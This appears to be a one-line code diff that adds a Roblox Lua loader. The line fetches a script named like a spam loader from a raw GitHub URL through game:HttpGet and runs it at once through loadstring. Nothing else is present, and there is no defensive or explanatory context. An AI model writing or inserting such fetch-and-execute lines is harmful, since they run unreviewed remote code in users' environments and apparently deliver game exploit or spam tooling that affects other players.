@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TealKnightFree/loaders/main/loaders/rainy-valley-spam2-fw2lyijtm668rx.lua"))()
